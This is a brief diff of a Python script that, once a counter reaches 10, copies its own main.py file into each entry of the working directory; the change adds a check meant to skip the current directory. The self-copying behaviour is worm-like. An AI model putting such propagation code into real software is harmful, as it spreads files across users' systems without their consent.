@@ -14,6 +14,8 @@ while count < 10:
 if count == 10:
     all = os.listdir(cwd)
     for dir in all:
-        time.sleep(1)
-        shutil.copy(f"{cwd}{sep}main.py", dir)
+        if dir == cwd: pass
+        else:
+            time.sleep(1)
+            shutil.copy(f"{cwd}{sep}main.py", dir)
     
